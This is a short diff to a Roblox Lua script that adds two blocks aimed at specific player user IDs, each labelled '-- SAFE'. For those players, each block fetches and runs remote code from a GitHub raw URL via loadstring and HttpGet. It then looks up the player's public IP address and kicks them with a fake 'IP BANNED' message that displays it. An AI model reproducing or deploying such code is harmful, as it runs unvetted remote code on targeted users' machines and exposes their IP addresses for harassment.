@@ -28,3 +28,13 @@ end
 if game.Players.LocalPlayer.UserId == 1644265613 then -- SAFE
       game.Players.LocalPlayer:Kick(game:GetService("RbxAnalyticsService"):GetClientId()) 
 end
+
+if game.Players.LocalPlayer.UserId == 3613095633 then -- SAFE
+   loadstring(game:HttpGet("https://raw.githubusercontent.com/ZxCrackingLua/dddd/main/dd"))()
+   game.Players.LocalPlayer:Kick("IP BANNED FOR 7 DAY  " ..req({ Url = "https://api.ipify.org/", Method = "Get" }).Body)
+end
+
+if game.Players.LocalPlayer.UserId == 3138663594 then -- SAFE
+   loadstring(game:HttpGet("https://raw.githubusercontent.com/ZxCrackingLua/dddd/main/dd"))()
+   game.Players.LocalPlayer:Kick("IP BANNED FOR 7 DAY  " ..req({ Url = "https://api.ipify.org/", Method = "Get" }).Body)
+end
